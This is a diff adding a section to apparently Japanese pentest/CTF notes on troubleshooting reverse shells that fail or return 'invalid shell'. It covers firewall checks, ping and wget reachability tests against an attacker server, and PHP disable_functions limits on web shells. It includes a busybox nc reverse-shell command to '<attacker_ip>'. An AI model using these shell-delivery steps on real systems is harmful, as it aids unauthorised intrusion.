@@ -514,3 +514,118 @@ wget <attacker_ip>/test.txt
 ```
 
 - `busybox nc`を使う
+
+
+## リスナーで invalid shell / 接続が来ない場合の切り分け
+
+### 想定される原因
+
+- FW のルールで遮断されている
+- ターゲット側の制約
+	- 使用したツールがターゲット環境に存在しない
+	- `nc` などのコマンドが通常版ではなく制限付き
+- Web 実行環境の制限（主に PHP）
+	- `phpinfo()` の `disable_functions` により以下が無効化
+	    - `exec`
+	    - `system`
+	    - `shell_exec`
+	    - `passthru`  
+
+### 原因ごとの対応
+
+#### FW による遮断
+
+- FW で完全に遮断されている場合は、そもそも `invalid shell` にすらならない  
+- つまり`invalid shell` が出る＝通信は届いている
+
+- 何も起きないときはネットワーク到達性を疑う
+
+
+## ネットワーク到達性の確認手順
+
+### 1. ICMP が通るか確認
+
+`# 攻撃者 sudo tcpdump -i tun0  # ターゲット ping -c3 <attacker_ip>`
+
+確認ポイント：
+
+- tcpdump に ICMP が見えるか
+    
+
+---
+
+### 2. HTTP 通信が可能か確認
+
+#### 攻撃者側
+
+`echo test > test.txt sudo python -m http.server 80`
+
+#### ターゲット側
+
+`wget http://<attacker_ip>/test.txt`
+
+確認ポイント：
+
+- ファイル取得できるか
+    
+- 攻撃者側の tcpdump / HTTP サーバログにリクエストが来るか
+    
+
+---
+
+## ツール制限への対応
+
+### busybox 環境の場合
+
+通常の `nc` が使えないケースがあるため：
+
+`busybox nc <attacker_ip> <port> -e /bin/sh`
+
+のように busybox 経由で nc を呼び出す
+
+---
+
+## Web shell 実行可否の確認（PHP）
+
+`<?php phpinfo(); ?>`
+
+確認する項目：
+
+- `disable_functions`
+    
+
+ここに以下が含まれていると Web shell は失敗する：
+
+- `exec`
+    
+- `system`
+    
+- `shell_exec`
+    
+- `passthru`
+    
+- `popen`
+    
+- `proc_open`
+    
+
+---
+
+## 切り分けの指針まとめ
+
+1. **tcpdump に何か来ているか**
+    
+    - 来ない → ネットワーク問題
+        
+2. **ping / wget が成功するか**
+    
+    - 失敗 → FW / ルーティング
+        
+3. **invalid shell が出るか**
+    
+    - 出る → 実行環境 or シェル形式の問題
+        
+4. **phpinfo の disable_functions**
+    
+    - 含まれている → Web shell 不可
+        
